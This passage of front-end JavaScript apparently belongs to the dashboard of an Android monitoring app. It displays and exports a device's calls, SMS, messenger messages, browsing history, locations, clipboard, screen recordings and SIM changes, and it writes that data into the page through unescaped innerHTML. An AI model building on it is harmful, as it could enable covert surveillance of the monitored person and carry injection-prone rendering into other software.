    tbody.innerHTML = screenRec.map(rec => `
        <tr>
            <td><a href="${rec.file_url}" target="_blank" style="color:#3b82f6;">${rec.file_url.split('/').pop()}</a></td>
            <td>${formatDuration(rec.duration_seconds)}</td>
            <td>${new Date(rec.recorded_at).toLocaleString()}</td>
        </tr>
    `).join('');
}

function updateRisksTable() {
    let risks = filterDataByDate(allData.risk_alerts);
    risks = searchData(risks, ['alert_type', 'description', 'source', 'content']);

    const tbody = document.getElementById("risks-table");
    if (risks.length === 0) {
        tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; padding:40px; color:#64748b;">No risk alerts yet</td></tr>';
        return;
    }
    tbody.innerHTML = risks.map(alert => `
        <tr>
            <td><span style="padding:4px 8px; border-radius:6px; font-size:12px; background:${alert.alert_type === 'sensitive_word' ? '#fef3c7' : '#fee2e2'}; color:${alert.alert_type === 'sensitive_word' ? '#d97706' : '#ef4444'};">${alert.alert_type}</span></td>
            <td>${alert.description}</td>
            <td>${alert.source}</td>
            <td style="max-width:300px; overflow:hidden; text-overflow:ellipsis;">${alert.content}</td>
            <td>${new Date(alert.recorded_at).toLocaleString()}</td>
        </tr>
    `).join('');
}

function updateDeviceInfo() {
    const container = document.getElementById("device-info-card");
    const info = allData.device_info[0];

    if (!info) {
        container.innerHTML = '<div style="text-align:center; padding:40px; color:#64748b;">No device info yet</div>';
        return;
    }

    container.innerHTML = `
        <div class="info-grid">
            <div class="info-item">
                <h4>Device Model</h4>
                <p>${info.model || "-"}</p>
            </div>
            <div class="info-item">
                <h4>Android Version</h4>
                <p>${info.android_version || "-"}</p>
            </div>
            <div class="info-item">
                <h4>RAM Available</h4>
                <p>${formatBytes(info.ram_available)}</p>
            </div>
            <div class="info-item">
                <h4>RAM Total</h4>
                <p>${formatBytes(info.ram_total)}</p>
            </div>
            <div class="info-item">
                <h4>Storage Available</h4>
                <p>${formatBytes(info.storage_available)}</p>
            </div>
            <div class="info-item">
                <h4>Storage Total</h4>
                <p>${formatBytes(info.storage_total)}</p>
            </div>
            <div class="info-item">
                <h4>Last Updated</h4>
                <p>${new Date(info.recorded_at).toLocaleString()}</p>
            </div>
        </div>
    `;
}

function updateNetworkTable() {
    let networkInfo = filterDataByDate(allData.network_info);
    const tbody = document.getElementById("network-table");
    if (networkInfo.length === 0) {
        tbody.innerHTML = '<tr><td colspan="4" style="text-align:center; padding:40px; color:#64748b;">No network info yet</td></tr>';
        return;
    }
    tbody.innerHTML = networkInfo.map(info => `
        <tr>
            <td>${info.wifi_ssid || "-"}</td>
            <td>${info.network_type || "-"}</td>
            <td>${info.signal_strength != null ? info.signal_strength + "%" : "-"}</td>
            <td>${new Date(info.recorded_at).toLocaleString()}</td>
        </tr>
    `).join('');
}

function updateSimTable() {
    let simChanges = filterDataByDate(allData.sim_changes);
    const tbody = document.getElementById("sim-table");
    if (simChanges.length === 0) {
        tbody.innerHTML = '<tr><td colspan="3" style="text-align:center; padding:40px; color:#64748b;">No SIM changes detected</td></tr>';
        return;
    }
    tbody.innerHTML = simChanges.map(sim => `
        <tr>
            <td>${sim.old_imsi || "-"}</td>
            <td>${sim.new_imsi || "-"}</td>
            <td>${new Date(sim.recorded_at).toLocaleString()}</td>
        </tr>
    `).join('');
}

function updateCharts() {
    const apps = filterDataByDate(allData.app_usage);
    const appUsageMap = {};
    apps.forEach(app => {
        const name = app.app_name || app.package_name;
        appUsageMap[name] = (appUsageMap[name] || 0) + app.usage_time;
    });

    const sortedApps = Object.entries(appUsageMap).sort((a, b) => b[1] - a[1]).slice(0, 6);
    appsChart.data.labels = sortedApps.map(([name]) => name);
    appsChart.data.datasets[0].data = sortedApps.map(([, time]) => Math.round(time / 60)); // Convert to minutes
    appsChart.update();
}

function exportToCSV() {
    let csvContent = '';
    const tablesToExport = ['call_logs', 'sms', 'messenger_messages', 'web_history', 'app_usage', 'locations', 'clipboard', 'network_info'];

    tablesToExport.forEach(table => {
        const data = filterDataByDate(allData[table]);
        if (data.length > 0) {
            csvContent += `--- ${table} ---\n`;
            const headers = Object.keys(data[0]);
            csvContent += headers.join(',') + '\n';
            data.forEach(row => {
                const values = headers.map(header => {
                    const val = row[header];
                    if (typeof val === 'string' && (val.includes(',') || val.includes('"'))) {
                        return `"${val.replace(/"/g, '""')}"`;
                    }
                    return val;
                });
                csvContent += values.join(',') + '\n';
            });
            csvContent += '\n';
        }
    });

    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' });
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = `device-monitor-export-${new Date().toISOString().split('T')[0]}.csv`;
    link.click();
}

function exportToJSON() {
    const exportData = {};
    const tablesToExport = ['call_logs', 'sms', 'messenger_messages', 'web_history', 'app_usage', 'locations', 'clipboard', 'network_info', 'device_info', 'sim_changes'];

    tablesToExport.forEach(table => {
        exportData[table] = filterDataByDate(allData[table]);
    });

    const blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = `device-monitor-export-${new Date().toISOString().split('T')[0]}.json`;
    link.click();
}
